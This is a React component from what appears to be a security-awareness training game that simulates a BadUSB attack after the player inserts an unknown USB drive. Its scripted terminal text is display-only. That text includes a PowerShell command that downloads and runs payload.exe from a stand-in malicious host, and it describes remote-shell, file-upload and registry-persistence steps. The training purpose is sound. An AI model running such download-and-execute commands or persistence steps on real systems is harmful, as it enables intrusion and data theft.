import { useState, useEffect, useRef } from "react";
import { useMission } from "../../missions/MissionContext";

// ─── Terminal lines that simulate a BadUSB attack ────────────────────────────
const TERMINAL_LINES = [
  { text: "Microsoft Windows [Version 10.0.19045.4170]", delay: 0 },
  { text: "(c) Microsoft Corporation. All rights reserved.", delay: 300 },
  { text: "", delay: 400 },
  { text: "C:\\Windows\\System32> ", delay: 600 },
  { text: "C:\\Windows\\System32> Initializing device driver...", delay: 900 },
  {
    text: "C:\\Windows\\System32> Device recognized as: HID Keyboard",
    delay: 1300,
  },
  { text: "", delay: 1500 },
  { text: "[USB_HID] Injecting keystrokes...", delay: 1800, warn: true },
  { text: "[USB_HID] Bypassing UAC prompt...", delay: 2400, warn: true },
  { text: "[USB_HID] Opening PowerShell (hidden)...", delay: 3000, warn: true },
  { text: "", delay: 3300 },
  {
    text: "PS C:\\> Invoke-WebRequest -Uri http://malicious.ru/payload.exe -OutFile $env:TEMP\\svc.exe",
    delay: 3600,
    danger: true,
  },
  {
    text: "PS C:\\> Start-Process $env:TEMP\\svc.exe -WindowStyle Hidden",
    delay: 4400,
    danger: true,
  },
  { text: "", delay: 4700 },
  {
    text: "[PAYLOAD] Establishing remote connection to 185.220.101.47:4444...",
    delay: 5000,
    danger: true,
  },
  { text: "[PAYLOAD] Connection established.", delay: 5800, danger: true },
  { text: "[PAYLOAD] Enumerating system files...", delay: 6200, danger: true },
  {
    text: "[PAYLOAD] Accessing: C:\\Users\\Employee\\Documents\\",
    delay: 6700,
    danger: true,
  },
  {
    text: "[PAYLOAD] Accessing: C:\\Users\\Employee\\Desktop\\passwords.txt",
    delay: 7200,
    danger: true,
  },
  {
    text: "[PAYLOAD] Uploading 3 files (12.4 MB)...",
    delay: 7800,
    danger: true,
  },
  { text: "[PAYLOAD] Upload complete.", delay: 8600, danger: true },
  {
    text: "[PAYLOAD] Installing persistence via registry key...",
    delay: 9000,
    danger: true,
  },
  {
    text: "[PAYLOAD] HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcHost32",
    delay: 9400,
    danger: true,
  },
  { text: "", delay: 9700 },
  {
    text: "[PAYLOAD] Remote shell active. Attacker has full access.",
    delay: 10000,
    danger: true,
  },
  { text: "[PAYLOAD] Clearing event logs...", delay: 10600, danger: true },
  { text: "[PAYLOAD] Done. Exiting silently.", delay: 11200, danger: true },
  { text: "", delay: 11600 },
  {
    text: "⚠  SYSTEM ALERT: Unusual activity detected on this machine.",
    delay: 12000,
    alert: true,
  },
];

// ─── Main Component ──────────────────────────────────────────────────────────
export default function BadUSBDesktop() {
  const { mission, setMission } = useMission();

  const [phase, setPhase] = useState("desktop"); // desktop | inserting | notification | terminal | alert | done
  const [terminalLines, setTerminalLines] = useState([]);
  const [currentLineIndex, setCurrentLineIndex] = useState(0);
  const [showNotification, setShowNotification] = useState(false);
  const [screenFlicker, setScreenFlicker] = useState(false);
  const [mouseFrozen, setMouseFrozen] = useState(false);
  const terminalRef = useRef(null);

  const isActive = mission.stage === "TASK9_BADUSB_SIMULATION";

  // ── Phase: inserting → notification ──
  useEffect(() => {
    if (!isActive || phase !== "inserting") return;
    const t = setTimeout(() => {
      setShowNotification(true);
      setPhase("notification");
    }, 2000);
    return () => clearTimeout(t);
  }, [isActive, phase]);

  // ── Phase: notification → terminal ──
  useEffect(() => {
    if (!isActive || phase !== "notification") return;
    const t = setTimeout(() => {
      setShowNotification(false);
      setPhase("terminal");
    }, 2500);
    return () => clearTimeout(t);
  }, [isActive, phase]);

  // ── Phase: terminal — stream lines one by one ──
  useEffect(() => {
    if (!isActive || phase !== "terminal") return;
    if (currentLineIndex >= TERMINAL_LINES.length) {
      // All lines shown → flicker + freeze + alert
      setTimeout(() => setScreenFlicker(true), 500);
      setTimeout(() => setMouseFrozen(true), 800);
      setTimeout(() => {
        setScreenFlicker(false);
        setPhase("alert");
      }, 1600);
      return;
    }

    const line = TERMINAL_LINES[currentLineIndex];
    const timeout = setTimeout(
      () => {
        setTerminalLines((prev) => [...prev, line]);
        setCurrentLineIndex((i) => i + 1);
        if (terminalRef.current) {
          terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
      },
      currentLineIndex === 0
        ? 300
        : TERMINAL_LINES[currentLineIndex].delay -
            TERMINAL_LINES[currentLineIndex - 1].delay,
    );

    return () => clearTimeout(timeout);
  }, [isActive, phase, currentLineIndex]);

  // ── Early return AFTER all hooks ──
  if (!isActive) return null;

  // ── Proceed after alert → report to NPC ──
  const handleAlertContinue = () => {
    setMission({
      ...mission,
      stage: "TASK9_REPORT_INCIDENT",
      result: "FAIL",
    });
  };

  // ── Render ──
  return (
    <div
      className={`fixed inset-0 z-[950] flex items-center justify-center p-4 font-sans
        ${screenFlicker ? "animate-pulse bg-red-900/20" : ""}`}
    >
      {/* Monitor Frame */}
      <div className="relative w-[70%] h-[90vh] bg-[#0c0c0c] rounded-xl p-8 shadow-[0_50px_100px_-20px_rgba(0,0,0,0.8)] border-[12px] border-[#222]">
        {/* Screen */}
        <div className="relative w-full h-full bg-[#0078D7] overflow-hidden flex flex-col shadow-inner">
          {/* Wallpaper gradient */}
          <div className="absolute inset-0 opacity-40 bg-[radial-gradient(circle_at_bottom_right,_var(--tw-gradient-stops))] from-blue-400 via-transparent to-transparent pointer-events-none" />

          {/* ── DESKTOP PHASE ── */}
          {phase === "desktop" && (
            <div className="flex-1 relative p-4 flex flex-col items-center justify-center gap-6">
              <div className="flex flex-col gap-6 absolute top-4 left-4">
                <DesktopIcon icon="🌐" label="Chrome" />
                <DesktopIcon icon="📂" label="This PC" />
                <DesktopIcon icon="🗑️" label="Recycle Bin" />
              </div>
              {/* USB insertion prompt */}
              <div className="bg-white/95 border-2 border-blue-400 rounded-xl shadow-2xl p-8 max-w-sm text-center z-10">
                <div className="text-5xl mb-4">🔌</div>
                <h2 className="text-xl font-black text-gray-800 mb-2">
                  Insert USB Drive?
                </h2>
                <p className="text-gray-600 text-sm mb-6">
                  You are about to plug the unknown USB into your workstation.
                </p>
                <button
                  onClick={() => setPhase("inserting")}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-xl transition-colors shadow"
                >
                  Insert USB
                </button>
              </div>
            </div>
          )}

          {/* ── INSERTING PHASE ── */}
          {phase === "inserting" && (
            <div className="flex-1 flex flex-col items-center justify-center gap-6">
              <div className="flex flex-col gap-6 absolute top-4 left-4">
                <DesktopIcon icon="🌐" label="Chrome" />
                <DesktopIcon icon="📂" label="This PC" />
                <DesktopIcon icon="🗑️" label="Recycle Bin" />
              </div>
              <div className="text-center z-10 text-white">
                <div className="text-6xl animate-spin mb-4">⚙️</div>
                <p className="font-bold text-lg">Connecting USB device...</p>
              </div>
            </div>
          )}

          {/* ── NOTIFICATION PHASE ── */}
          {(phase === "notification" ||
            (phase === "terminal" && showNotification)) && (
            <div className="flex-1 relative p-4">
              <div className="flex flex-col gap-6 absolute top-4 left-4">
                <DesktopIcon icon="🌐" label="Chrome" />
                <DesktopIcon icon="📂" label="This PC" />
                <DesktopIcon icon="🗑️" label="Recycle Bin" />
              </div>
              {/* Windows toast notification */}
              {showNotification && (
                <div className="absolute bottom-14 right-4 w-80 bg-[#1c1c1c] border border-gray-600 rounded-lg shadow-2xl p-4 flex items-start gap-3 animate-slide-in-right z-50">
                  <div className="text-2xl">💾</div>
                  <div>
                    <p className="text-white font-bold text-sm">
                      USB Device Detected
                    </p>
                    <p className="text-gray-400 text-xs mt-1">
                      KINGSTON DataTraveler — Device ready.
                    </p>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ── TERMINAL PHASE ── */}
          {(phase === "terminal" || phase === "alert") && (
            <div className="flex-1 relative p-4 flex flex-col">
              <div className="flex flex-col gap-6 absolute top-4 left-4 z-0 opacity-40 pointer-events-none">
                <DesktopIcon icon="🌐" label="Chrome" />
                <DesktopIcon icon="📂" label="This PC" />
                <DesktopIcon icon="🗑️" label="Recycle Bin" />
              </div>

              {/* Terminal Window */}
              <div
                className="absolute inset-6 bg-black rounded-sm flex flex-col overflow-hidden border border-gray-700 shadow-2xl z-10"
                style={{ cursor: mouseFrozen ? "not-allowed" : "default" }}
              >
                {/* Title bar */}
                <div className="h-8 bg-[#0c0c0c] flex items-center px-3 gap-2 border-b border-gray-800">
                  <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full bg-red-500" />
                    <div className="w-3 h-3 rounded-full bg-yellow-500" />
                    <div className="w-3 h-3 rounded-full bg-green-500" />
                  </div>
                  <span className="text-gray-400 text-xs ml-2 font-mono">
                    Administrator: C:\Windows\System32\cmd.exe
                  </span>
                </div>

                {/* Terminal output */}
                <div
                  ref={terminalRef}
                  className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-5"
                >
                  {terminalLines.map((line, i) => (
                    <div
                      key={i}
                      className={
                        line.danger
                          ? "text-red-400"
                          : line.warn
                            ? "text-yellow-400"
                            : line.alert
                              ? "text-red-300 font-bold animate-pulse"
                              : "text-gray-300"
                      }
                    >
                      {line.text || "\u00A0"}
                    </div>
                  ))}
                  {phase === "terminal" && (
                    <span className="text-gray-300 animate-pulse">█</span>
                  )}
                </div>
              </div>

              {/* Mouse frozen overlay */}
              {mouseFrozen && (
                <div className="absolute inset-0 z-20 cursor-not-allowed" />
              )}
            </div>
          )}

          {/* ── ALERT PHASE ── */}
          {phase === "alert" && (
            <div className="absolute inset-0 z-30 flex items-center justify-center bg-black/60">
              <div className="bg-[#f0f0f0] border-2 border-gray-400 shadow-2xl w-96 text-sm font-sans flex flex-col rounded">
                {/* Title bar */}
                <div className="bg-[#0078d7] px-3 py-2 flex items-center gap-2 rounded-t">
                  <span className="text-yellow-300 text-base">⚠</span>
                  <span className="text-white font-bold text-sm">
                    Windows Security Alert
                  </span>
                </div>
                <div className="p-6 bg-white flex gap-4 items-start">
                  <span className="text-4xl text-red-500 mt-1">🛡️</span>
                  <div>
                    <p className="font-black text-red-700 mb-2 text-base">
                      Unusual Activity Detected
                    </p>
                    <p className="text-gray-700 text-sm leading-relaxed">
                      An external device has executed unauthorized scripts on
                      this machine. Remote access may have been established.
                    </p>
                    <p className="text-gray-500 text-xs mt-3">
                      Report this incident to your administrator immediately.
                    </p>
                  </div>
                </div>
                <div className="bg-[#f0f0f0] px-4 py-3 flex justify-end border-t border-gray-300 rounded-b">
                  <button
                    onClick={handleAlertContinue}
                    className="px-8 py-2 bg-[#0078d7] hover:bg-blue-700 text-white rounded font-bold text-sm shadow transition-colors"
                  >
                    OK — Report Incident
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* ── TASKBAR (always visible) ── */}
          <div className="h-10 bg-[#000000cc] backdrop-blur-md border-t border-white/10 flex items-center px-1 gap-1 z-50 relative">
            <div className="w-10 h-10 flex items-center justify-center text-xl cursor-default text-blue-400">
              ⊞
            </div>
            <div className="w-10 h-10 flex items-center justify-center text-white/80 cursor-default">
              🔍
            </div>
            <div className="ml-auto flex items-center h-full px-2 gap-3 text-white/90 text-xs">
              <span>ENG</span>
              <div className="text-right cursor-default leading-tight">
                <div>10:24 PM</div>
                <div>2/16/2026</div>
              </div>
            </div>
          </div>
        </div>

        {/* Monitor stand */}
        <div className="absolute top-full left-1/2 -translate-x-1/2 w-32 md:w-48 h-[50vh] bg-gradient-to-b from-[#111] to-[#050505] border-x-[12px] border-[#222] -z-10 shadow-[inset_0_30px_30px_rgba(0,0,0,0.8)]">
          <div className="w-full h-full flex justify-center">
            <div className="w-12 border-x border-[#1a1a1a] h-full" />
          </div>
        </div>
      </div>

      <style>{`
        @keyframes slide-in-right {
          from { transform: translateX(120%); opacity: 0; }
          to   { transform: translateX(0);    opacity: 1; }
        }
        .animate-slide-in-right {
          animation: slide-in-right 0.4s ease-out forwards;
        }
      `}</style>
    </div>
  );
}

function DesktopIcon({ icon, label }) {
  return (
    <div className="flex flex-col items-center w-20 cursor-default select-none">
      <div className="text-4xl drop-shadow-md mb-1">{icon}</div>
      <span className="text-[11px] text-white text-center font-medium leading-tight px-1">
        {label}
      </span>
    </div>
  );
}
